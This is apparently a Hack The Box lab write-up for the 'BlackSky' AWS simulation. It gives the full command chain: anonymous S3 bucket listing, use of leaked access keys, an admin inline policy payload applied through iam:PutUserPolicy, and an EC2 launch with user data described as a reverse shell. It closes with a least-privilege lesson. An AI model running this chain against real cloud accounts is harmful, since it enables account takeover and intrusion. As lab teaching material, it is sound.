---
title: "HTB: BlackSky"
tags: [htb, cloud, aws, s3, bucket, iam, privilege-escalation]

description: "A deep dive into AWS misconfigurations. Enumerating public S3 buckets, recovering leaked keys, and abusing IAM PutUserPolicy to takeover the account."
---

# Hack The Box: BlackSky

**Machine IP**: `10.10.11.x`
**OS**: Linux (AWS Simulation)
**Difficulty**: Medium

BlackSky is a realistic simulation of a cloud breach. It ignores traditional port scanning in favor of cloud enumeration steps: Subdomain enumeration -> Bucket Brute Forcing -> IAM abuse.

---

## 1. Cloud Reconnaissance

### Subdomain Enumeration
We start not with Nmap, but with DNS.
```bash
gobuster dns -d blacksky.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```
**Result**:
*   `s3.blacksky.htb`
*   `files.blacksky.htb`

### S3 Enumeration
We attempt to interact with the identified bucket endpoint. Standard AWS tools will try to sign requests with your real credentials, so we use `--no-sign-request` to act anonymously.

```bash
aws --endpoint-url http://s3.blacksky.htb s3 ls s3://files --no-sign-request
```

**Output**:
```text
2023-01-01 12:00:00   1405 config.php.bak
2023-01-01 12:00:00   3245 logo.png
```

We download the `config.php.bak`.
```bash
aws --endpoint-url http://s3.blacksky.htb s3 cp s3://files/config.php.bak . --no-sign-request
```

---

## 2. Exploitation (Leaked Credentials)

Inside the config file, we find hardcoded AWS credentials. This is the **#1 cause of cloud breaches** globally.

```php
define('AWS_ACCESS_KEY_ID', 'AKIA5555555555EXAMPLE');
define('AWS_SECRET_ACCESS_KEY', 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY');
```

We configure a local profile to use these keys.
```bash
aws configure --profile compromised
```

We test access:
```bash
aws --endpoint-url http://s3.blacksky.htb sts get-caller-identity --profile compromised
```
**Identity**: `user: developer` (Account ID: `123456789`)

---

## 3. Privilege Escalation (IAM Abuse)

We need to know what we can do. We enumerate attached policies.

```bash
aws --endpoint-url http://s3.blacksky.htb iam list-attached-user-policies --user-name developer --profile compromised
```
It returns a custom policy `DeveloperPolicy`. We verify the specific permissions:

```bash
aws --endpoint-url http://s3.blacksky.htb iam get-policy-version --policy-arn arn:aws:iam::123456789:policy/DeveloperPolicy --version-id v1
```

**JSON Output**:
```json
{
    "Effect": "Allow",
    "Action": [
        "iam:PutUserPolicy",
        "iam:GetUser"
    ],
    "Resource": "*"
}
```

### The Misconfiguration
The user has `iam:PutUserPolicy`. This allows them to attach *any* inline policy to themselves.
We can simply grant ourselves Administrator access.

**Payload (admin-policy.json)**:
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        }
    ]
}
```

**Command**:
```bash
aws --endpoint-url http://s3.blacksky.htb iam put-user-policy --user-name developer --policy-name Pwned --policy-document file://admin-policy.json --profile compromised
```

We confirm our new power. We now have effectively **Root** access to the Cloud Account.

---

## 4. Stability (Reverse Shell)

In a real AWS environment, we would stop here. But since this is a CTF box, we need a shell on the underlying host.
We leverage our Admin access to spawn a new instance (or modify an existing one) with a malicious "User Data" script.

```bash
aws --endpoint-url http://s3.blacksky.htb ec2 run-instances --image-id ami-12345 --count 1 --instance-type t2.micro --user-data file://shell.sh --profile compromised
```
*`shell.sh` contains a standard bash reverse shell.*

## Conclusion
BlackSky demonstrates that once you lose an Access Key, your only defense is the **Principle of Least Privilege**. Giving a developer `PutUserPolicy` is equivalent to giving them Domain Admin.
